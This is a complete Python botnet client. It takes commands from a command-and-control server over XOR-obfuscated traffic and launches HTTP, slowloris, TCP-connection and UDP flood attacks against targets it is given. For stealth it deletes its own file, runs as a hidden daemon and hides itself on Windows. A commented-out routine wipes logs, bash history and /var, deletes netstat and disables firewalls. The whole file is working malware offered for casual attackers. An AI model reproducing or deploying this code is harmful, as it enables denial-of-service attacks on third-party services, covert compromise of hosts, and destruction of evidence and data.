#!/usr/bin/env python3
#Code By Leeon123
###################################################
# This is a new version of python3-botnet project #
#      Added new stuff like daemon, slowloris...  #
#              Good Luck have Fun                 #
###################################################
#--  Aoyama version v1   --#
# Added xor encode traffic #
# Added auto enable ssl    #
# Improved dos attack code #
# New process lock desgin  #
# More easy for the skid   #
############################
import socket
import ssl
import sys
import os
import time
import random
import threading
import base64 as b64

cnc   = str("127.0.0.1")#your cnc ip
cport = int(1337)#your cnc port
key   = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

stop    = False#threads control
def HTTP(ip, port, path):
	global stop
	while True:
		if stop :
			break
		get_host = "GET "+path+"?"+str(random.randint(0,50000))+" HTTP/1.1\r\nHost: " + ip + "\r\n"
		connection = "Connection: Keep-Alive\r\n"
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = random.choice(acceptall)
		http = get_host + useragent + accept + connection + "\r\n"
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect((str(ip), int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			for y in range(100):
				s.send(str.encode(http))
			#s.close()
		except:
			s.close()

def SLOW(ip, port, conns, path):#slowloris, reference from https://github.com/gkbrk/slowloris
	global stop
	socket_list = []
	get_host = "GET "+path+"?"+str(random.randint(0,50000))+" HTTP/1.1\r\nHost: " + ip + "\r\n"
	connection = "Connection: Keep-Alive\r\n"
	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
	accept = random.choice(acceptall)
	header = get_host + useragent + accept + connection
	for _ in range(int(conns)):
		try:
			if stop:#if stop=False then countine
				break
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip), int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			s.send(str.encode(header))
			socket_list.append(s)
		except:
			pass
	while True:#loop
		if stop:#if stop=False then countine
			break
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
			except socket.error:
				socket_list.remove(s)
		for _ in range(int(conns)-len(socket_list)):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(ip), int(port)))
				if port == 443:
					s = ssl.wrap_socket(s)
				s.send(str.encode(header))
				socket_list.append(s)
			except:
				pass
		#go back to line 100

def CC(ip, port):#connection flood
	global stop
	while True:
		if stop :
			break
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			s.send("\000".encode())
			s.close()
		except:
			s.close()

def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router may filter it)
	global stop
	while True:
		if stop :
			break
		udpbytes = random._urandom(int(size))
		sendip=(str(ip),int(port))
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
			for y in range(100):
				s.sendto(udpbytes, sendip)
			s.close()
		except:
			s.close()

def handle(sock):
	global stop
	attack = 0
	sock.send(xor_enc("1337",key).encode())#login code
	while True:
		tmp = sock.recv(1024).decode()
		if len(tmp) == 0:
			break#return main loop
		#print(tmp)
		data = xor_dec(tmp,key)
		if data[0] == '!':
			try:
				command = data.split()
				print(command)
				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=CC, args=(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=SLOW, args =(command[1],command[2],command[4],command[5]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAQCRc=',key):#!stop
					stop = True
					attack = 0#clear attack list
				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
					sock.close()
					return 1
			except:#if have error than will pass
				pass
		if data == xor_dec("ERoKAQ==",key):#ping
			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
	return 0

def daemon():#daemon
	pid = os.fork()#first fork
	if pid:
		os._exit(0)
	os.chdir('/')
	os.umask(0)
	os.setsid()
	_pid = os.fork()#second fork for careful, prevent the process from opening a control terminal again
	if _pid:
		os._exit(0)
	sys.stdout.flush()#Refresh buffer
	sys.stderr.flush()
	sys.stdin = open("/dev/null")#off the stdin,stdout,stderr, indeed no need.
	sys.stdout= open("/dev/null")#windows can't use this method, only can use pyinstaller's option '--noconsole'
	sys.stderr= open("/dev/null")
'''
def clean_device():#don't use it if u don't want be detected in dbg
	os.system("rm -rf /tmp/* /var/tmp/* /var/run/* /var/*")
	os.system("rm -rf /bin/netstat")
	os.system("cat /dev/null > /var/log/wtmp")
	os.system("iptables -F")
	os.system("service iptables stop")
	os.system("/sbin/iptables -F")
	os.system("/sbin/iptables -X")
	os.system("service firewalld stop")
	os.system("rm -rf ~/.bash_history")
	os.system("history -c")
'''
def conn():
	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
		if os.name != "nt":
			os.system('rm -rf '+sys.argv[0])#delete ourselves
			daemon()#can't use in windows
			#clean_device()
		else:
			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
	while True:#magic loop
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
			s.connect((cnc,cport))

			signal = handle(s)
			if signal == 1:
				break

		except:
			time.sleep(random.randint(1,60))
			pass

#xor enc part#
def xor_enc(string,key):
	lkey=len(key)
	secret=[]
	num=0
	for each in string:
		if num>=lkey:
			num=num%lkey
		secret.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):

	leter = b64.b64decode( string.encode() ).decode()
	lkey=len(key)
	string=[]
	num=0
	for each in leter:
		if num>=lkey:
			num=num%lkey

		string.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return "".join( string )

if __name__ == '__main__':
	conn()
